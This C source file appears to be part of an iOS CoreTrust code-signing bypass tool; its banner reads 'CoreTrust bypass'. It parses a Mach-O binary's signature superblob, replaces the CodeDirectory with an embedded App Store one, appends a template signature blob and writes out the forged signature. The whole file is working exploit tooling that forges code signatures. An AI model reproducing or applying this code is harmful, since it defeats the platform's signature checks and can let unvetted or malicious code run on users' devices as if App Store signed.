#include <choma/CSBlob.h>
#include <choma/MachOByteOrder.h>
#include <choma/Host.h>
#include <choma/MemoryStream.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include "AppStoreCodeDirectory.h"
#include "TemplateSignatureBlob.h"
#include <stdio.h>

int main(int argc, char *argv[]) {
    printf("CoreTrust bypass eta s0n!!\n");

    if (argc < 2) {
        printf("Usage: %s <path to MachO file>\n", argv[0]);
        return -1;
    }

    // Make sure the last argument is the path to the FAT/MachO file
    struct stat fileStat;
    if (stat(argv[argc - 1], &fileStat) != 0 && argc > 1) {
        printf("Please ensure the last argument is the path to a FAT/MachO file.\n");
        return -1;
    }

    char *filePath = argv[1];

    FAT *fat = fat_init_from_path(filePath);
    if (!fat) { return -1; }

    MachO *macho = fat_find_preferred_slice(fat);
    if (!macho) return -1;

    CS_SuperBlob *superblob = (CS_SuperBlob *)macho_find_code_signature(macho);

    FILE *fp = fopen("data/blob.orig", "wb");
    fwrite(superblob, BIG_TO_HOST(superblob->length), 1, fp);
    fclose(fp);

    DecodedSuperBlob *decodedSuperblob = superblob_decode(superblob);

    // Replace the first CodeDirectory with the one from the App Store
    DecodedBlob *blob = decodedSuperblob->firstBlob;
    if (blob->type != CSSLOT_CODEDIRECTORY) {
        printf("The first blob is not a CodeDirectory!\n");
        return -1;
    }

    memory_stream_free(blob->stream);
    MemoryStream *newCDStream = buffered_stream_init_from_buffer(AppStoreCodeDirectory, AppStoreCodeDirectory_len);
    blob->stream = newCDStream;

    DecodedBlob *signatureBlob = malloc(sizeof(DecodedBlob));
    signatureBlob->type = CSSLOT_SIGNATURESLOT;
    signatureBlob->stream = buffered_stream_init_from_buffer(TemplateSignatureBlob, TemplateSignatureBlob_len);
    signatureBlob->next = NULL;

    // Add the signature blob to the end of the superblob
    DecodedBlob *nextBlob = decodedSuperblob->firstBlob;
    while (nextBlob->next) {
        nextBlob = nextBlob->next;
    }
    nextBlob->next = signatureBlob;

    CS_SuperBlob *newSuperblob = superblob_encode(decodedSuperblob);

    // Write the new superblob to the file
    fp = fopen("data/blob.generated", "wb");
    fwrite(newSuperblob, BIG_TO_HOST(newSuperblob->length), 1, fp);
    fclose(fp);

    decoded_superblob_free(decodedSuperblob);
    free(superblob);
    free(newSuperblob);

    fat_free(fat);
    return 0;
}